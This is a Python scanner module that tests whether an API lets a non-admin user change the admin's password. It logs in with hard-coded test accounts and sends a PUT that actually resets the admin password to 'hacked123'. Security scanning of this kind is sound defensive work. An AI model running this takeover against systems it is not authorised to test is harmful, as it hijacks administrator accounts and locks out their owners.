#!/usr/bin/env python3
"""
Unauthorized Password Change (Account Takeover) Test Script
Checks if an API endpoint is vulnerable to unauthorized password changes
by attempting to modify another user's password using a non-admin token.
"""

import requests
from typing import Dict, List, Optional, Any
from .base_scanner import BaseScanner
from RAGScripts.utils.logger import setup_scanner_logger

class UnauthorizedPasswordChangeScanner(BaseScanner):
    @staticmethod
    def scan(url: str, method: str, path: str, response: requests.Response, token: Optional[str] = None, headers: Optional[Dict[str, str]] = None) -> List[Dict[str, Any]]:
        logger = setup_scanner_logger("unauthorized_password_change")
        vulnerabilities = []
        
        # Test credentials
        test_users = [
            {"username": "test1", "password": "test1"},
            {"username": "test2", "password": "test2"}
        ]
        
        for user in test_users:
            try:
                # Login to get auth token
                login_url = f"{url}/users/v1/login"
                login_resp = requests.post(
                    login_url,
                    json=user,
                    timeout=5
                )
                
                if login_resp.status_code != 200:
                    continue
                    
                auth_token = login_resp.json().get("auth_token")
                if not auth_token:
                    continue
                    
                # Try to change another user's password
                target_username = "admin"
                new_password = "hacked123"
                
                change_url = f"{url}/users/v1/{target_username}/password"
                request_headers = headers or {}
                request_headers["Authorization"] = f"Bearer {auth_token}"
                payload = {"password": new_password}
                
                change_resp = requests.put(
                    change_url,
                    headers=request_headers,
                    json=payload,
                    timeout=5
                )
                
                if change_resp.status_code == 204:
                    vulnerabilities.append({
                        "type": "UNAUTHORIZED_PASSWORD_CHANGE",
                        "severity": "HIGH",
                        "detail": f"Successfully changed password for user {target_username} using non-admin token",
                        "evidence": {
                            "url": change_url,
                            "response_code": change_resp.status_code,
                            "test_user": user["username"]
                        }
                    })
                    
            except requests.RequestException as e:
                logger.error(f"Error in unauthorized password change check: {str(e)}")
                
        return vulnerabilities

scan = UnauthorizedPasswordChangeScanner.scan
